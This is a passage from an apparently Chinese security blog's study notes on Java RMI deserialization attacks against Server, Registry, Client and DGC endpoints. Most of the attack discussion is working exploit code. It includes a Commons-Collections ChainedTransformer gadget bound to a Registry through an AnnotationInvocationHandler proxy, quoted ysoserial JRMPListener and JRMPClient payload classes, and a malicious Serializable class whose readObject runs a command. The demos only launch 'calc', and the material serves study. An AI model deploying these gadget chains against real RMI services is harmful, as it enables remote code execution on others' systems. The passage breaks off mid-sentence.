class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>即调试下断点的时候，在<code>RemoteObjectInvocationHandler</code>调用<code>invokeRemoteMethod</code>的时候修改method（在 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法处下断，将 Method 改为服务端存在的 HelloObject 的 Method），下面<code>getMethodHash(method)</code>获取到的哈希就和服务端的一样了，后续弹calc都一样的。</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 师傅使用了 Java Agent 的方式插桩，在<a href="https://www.anquanke.com/post/id/200860">这篇文章</a>里，0c0c0f 师傅使用了流量层的替换，在<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">这篇文章</a>里，有兴趣的师傅请自行查看。</p><p>利用这种方式，就大大的扩展了利用链。RMI 的反序列化逻辑位于 <code>sun.rmi.server.UnicastRef#unmarshalValue</code>，如下：</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>可以看到，除了基础数据类型，其他的类型均能调用 readObject 进行反序列化，甚至原本 String 类型的参数也会走 readObject 反序列化，那么结合之前的替换手段，总结起来就是：</p><blockquote><p><strong>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</strong></p></blockquote><h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>上面说过，RMI反序列化参数的时候，若在本地找不到类，会在指定的codebase下加载类，而codebase可以由客户端指定，那么这就是一个很有用的打反序列化的地方。这个特性在 6u45&#x2F;7u21 之前都是默认开启的。</p><p>为了能够远程加载目标类，需要 Server 加载并配置 SecurityManager，并设置 <code>java.rmi.server.useCodebaseOnly=false</code>。</p><p>Server 端调用 UnicastServerRef 的 <code>dispatch</code> 方法处理客户端请求，调用 <code>unmarshalParameters</code> 方法反序列化客户端传来的参数。</p><p>反序列化过程由 RMI 封装类 MarshalInputStream 来实现，会调用 <code>resolveClass</code> 来解析 Class。</p><p>无论 Server 端还是 Client 端，只要有一端配置了 <code>java.rmi.server.codebase</code>，这个属性都会跟随数据流在两端流动。</p><p><strong>因此，Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 <code>java.rmi.server.codebase</code> 地址中远程加载恶意类而触发攻击。</strong></p><h4 id="替身攻击"><a href="#替身攻击" class="headerlink" title="替身攻击"></a>替身攻击</h4><p>在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，su18师傅称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。</p><p>大体的思路就是调用的方法参数是 <code>HelloObject</code>，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。</p><p>这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。</p><h3 id="Registry-端-Attack"><a href="#Registry-端-Attack" class="headerlink" title="Registry 端 Attack"></a>Registry 端 Attack</h3><p>在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。</p><p>所以如果我们是一个恶意的 Server 端，向 Registry 端输送了一个恶意的对象，在其反序列化时就可以触发恶意调用。</p><p>这里仍然用 CC6 测试，而因为 bind 的参数是需要是 Remote 类型的，所以这里使用了 AnnotationInvocationHandler 来代理了 Remote 接口，形成了反序列化漏洞。</p><p>形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 连接 Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind 到 Registry 时会触发反序列化</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 初始化 Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// 创建 ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要 Registry 端具有相应的依赖及相应 JDK 版本需求。</p><p>这个攻击手段实际上就是 ysoserial 中的 <strong>ysoserial.exploit.RMIRegistryExploit</strong> 的实现原理。</p><p>除了 bind，由于 lookup&#x2F;rebind 等方法均通过反序列化传递数据，因此此处的实际攻击手段不止 bind 一种。也就是说，名义上的 Server 端和 Client 端都可以攻击 Registry 端。</p><h3 id="Client-端-Attack"><a href="#Client-端-Attack" class="headerlink" title="Client 端 Attack"></a>Client 端 Attack</h3><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p><p>这部分攻击实战意义较少，并且与上述讨论的攻击 Server 端和 Registry 端的攻击都是镜像行为，所以这里简单描述一下流程就不再演示了。</p><p>客户端的攻击和上面的都类似，大概就下面几个攻击点</p><ul><li>恶意Server返回方法调用结果</li><li>恶意Server(Registry)返回Stub</li><li>动态类加载（Server返回的调用结果若为客户端不存在的类，客户端也支持动态加载）</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGC（Distributed Garbage Collection）</strong>—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p><p>RMI 定义了一个 <code>java.rmi.dgc.DGC</code> 接口，提供了两个方法 <code>dirty</code> 和 <code>clean</code>：</p><ul><li>客户端想要使用服务端上的远程引用，使用 <code>dirty</code> 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用 <code>clean</code> 方法来清楚这个远程引用。</li></ul><p>这个接口有两个实现类，分别是 <code>sun.rmi.transport.DGCImpl</code> 以及 <code>sun.rmi.transport.DGCImpl_Stub</code>，同时还定义了 <code>sun.rmi.transport.DGCImpl_Skel</code>。</p><p>这个命名方式看着确实非常眼熟。</p><p>没错，很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。</p><p>攻击手段就是</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>见ysoserial的<code>exploit.JRMPListener</code>和<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击的gadget分 UnicastRemoteObject、UnicastRef和RemoteObject三种。这里不做过多解释。</p><p>总结为</p><ul><li>exploit<ul><li>JRMPListner：构造恶意JRMP服务器，返回异常让客户端反序列化 <code>StreamRemoteCall#executeCall</code></li><li>JRMPClient：发送恶意序列化数据，打DGC服务 <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListner：<code>UnicastRemoteObject</code>反序列化时会导出对象，触发JRMP监听端口，配合exploit.JRMPClient打</li><li>JRMPClient：<code>UnicastRef</code>反序列化时会触发DGC的<code>ditry</code>，配合exploit.JRMPListner打</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>最后浅浅打一个简单使用RMI服务调用远程对象反序列化弹calc作为我最后的结束吧，JEP 290的bypass放在后面文章再进行复现。JNDI也同样会放在后面再详细复盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>抄了下<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">【心得】java JNDI配合RMI实现注入个人笔记_${jndi:rmi:-CSDN博客</a>（我是懒狗）</p><p>原理很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、定义远程接口 (RMITest.java):  <br>· 定义了一个远程接口 RMITest，其中包含两个方法 testcalc() 和 sayObject(Object obj)。<br>这些方法声明抛出 RemoteException，以便在远程调用时处理可能的网络问题。<br><br><span class="hljs-number">2</span>、实现远程接口 (RMITestImpl.java):  <br>· RMITestImpl 类实现了 RMITest 接口，并继承了 UnicastRemoteObject，使其成为一个远程对象。<br>· 在 testcalc() 方法中，使用 Runtime.getRuntime().exec(<span 